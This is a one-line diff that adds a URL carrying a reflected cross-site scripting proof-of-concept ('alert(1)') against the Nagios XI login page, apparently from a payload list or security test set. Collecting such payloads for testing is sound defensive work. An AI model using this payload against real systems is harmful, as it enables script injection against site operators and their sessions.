@@ -1,0 +1,1 @@
+ http://example.com/nagiosxi/login.php?%22;alert%281%29;//
